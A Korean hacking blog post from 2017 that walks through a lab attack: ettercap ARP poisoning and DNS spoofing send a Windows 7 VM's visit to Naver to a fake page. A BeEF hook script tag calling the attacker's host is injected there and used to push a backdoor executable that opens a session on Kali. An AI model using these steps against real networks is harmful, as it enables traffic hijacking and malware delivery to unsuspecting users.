---
layout: post
cover: 'assets/images/cover6.jpg'
title:  DNS Spoofing
date:   2017-07-26 10:52:01
tags: hacking
subclass: 'Dns_spoofing'
categories: 'pjya0321'
navigation: True
logo: 'assets/images/ghost.png'
---


## 	
DNS스푸핑을 통한 악성코드 배포
-----

크게 두 단계로 나누면  
1.내장툴 ettercap 을 사용해서 DNS스푸핑 공격을 한다.  
2.beef를 사용해서 백도어가 다운되게 리다이렉션 한다.  

![1](assets/postimage/DNS1.png)

etter.dns 파일을 위와같이 수정해준다.  

![2](assets/postimage/DNS2.png)

아파치서버를 실행시킨다.  

![3](assets/postimage/DNS3.png)

칼리리눅스 내장툴인 ettercap 을 실행시킨다.  

1. eth0을 잡고 호스트를 스캔한다.  
2. 게이트웨이를 타겟1에/ 공격대상을 타겟2로 설정해준다.  
3. ARP 포지셔닝에서 Sniff remote connection을 체크한다.  
4. 플러그인에서 dns_spoof 를 설정한다.  

![4](assets/postimage/DNS4.png)

공격대상인 윈7 가상환경에서 네이버에 접속하면 미리 만들어둔  
/var/www/html 경로의 index.html 의 내용이 연결된다.  

![5](assets/postimage/DNS5.png)

Beef 서버를 실행시키고. Hook URL을 위에 연결된 index.html에 넣어준다.  

script src="http://192.168.254.129:3000/hook.js"type="text/javascript"  

![6](assets/postimage/DNS6.png)

/var/www/html 경로에 악성백도어를 저장하고,  
UI패널을 열어서 (id/pw = beef/beef) 로그인을 한 뒤,리다이렉션 주소에 악성백도어 파일명.확장자명 을 입력한다.  
그리고 적용시킨다.  

![7](assets/postimage/DNS7.png)

윈도우7 화면에는 kangol.exe 파일이 다운로드가 되었다.  
(중간에 네이버처럼 보이도록 연결될 html을 수정했다)  

![8](assets/postimage/DNS8.png)


윈도우7에서 다운받은 백도어를 실행시키면 칼리에서 세션이 열린것을 확인 할 수 있다.  



